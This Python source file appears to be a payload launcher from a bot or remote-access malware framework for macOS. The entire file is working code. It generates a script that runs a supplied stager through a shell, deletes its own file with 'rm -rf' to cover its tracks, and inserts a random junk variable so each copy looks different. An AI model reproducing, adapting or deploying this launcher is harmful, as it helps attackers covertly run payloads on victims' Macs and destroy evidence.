# -*- coding: utf-8 -*-
"""
Python 3 compatible launcher for modern macOS (Python 3 + /usr/bin/env python3)
"""
__author__ = "Marten4n6 (patched for Py3)"
__license__ = "GPLv3"

from bot.launchers.helper import LauncherABC, random_string
from textwrap import dedent
from typing import Tuple


class Launcher(LauncherABC):
    def generate(self, stager: str) -> Tuple[str, str]:
        # Use /usr/bin/env python3 so it works on modern macOS
        # where /usr/bin/python may not exist or be Python 2.
        return ("py", dedent("""\
        #!/usr/bin/env python3
        # -*- coding: utf-8 -*-
        import subprocess
        import os
        
        {} = "{}"
        subprocess.Popen("{}", shell=True)
        subprocess.Popen("rm -rf " + __file__, shell=True)
        """).format(random_string(), random_string(numbers=True), stager.replace('"', '\\"')))